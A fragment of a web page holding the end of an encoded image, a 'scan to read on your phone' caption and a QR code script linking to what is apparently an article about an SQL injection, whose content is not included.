nNou2gD8dW+iq1DSoDtx8JElSmEDzpWRgi90sxBeKD/g2drQgjdXxfEGmq/ahTQfVor3EOodQ5xjsw7P9PsEbaBaLHi8ycwDQT6KwPm/MqW/WoQ2g+9lznpjjMOotYe4VgnDsJnTSheAaEpd0Bw0NGaah0QurWMEBrMWPky59zPEU4DsWnhZ05gDeQz53741LcORFdOkZ+m9VHAfM2hc7mPcpi13FseBXRf1pVLd2g9hrWM9sDc1z57Mlo7Qnuh933rQI4evPj9CZyt3joQiEnnB8I1zq+WXHuWw9zXPTJC+CAwa1V/61mDuRb2XOXP3NX8rQO5+tDlOz6BNZDjs/mIMg3EV/YIz3bpmsoDccWBSt5+w4f+27N7CcuCbxJotd9UW8PcD2a/64TQdYhce1BArAFZtwB2zwM2Xn+oZgzxDmCrzZ5pIDYv/MwJtIFATAuu4dl2ofc48+VXhn3QayFya5U/cxD+ioNZc18IDTBVYu5rQ+acWwO2GwAdrWWErreBZMPKP3cCayCfO/vyyf8DAAD///6XoqQAAAAGSURBVAMA84h8sxx1TNMAAAAASUVORK5CYII=)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/jhsoft-CostApplyHandler-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 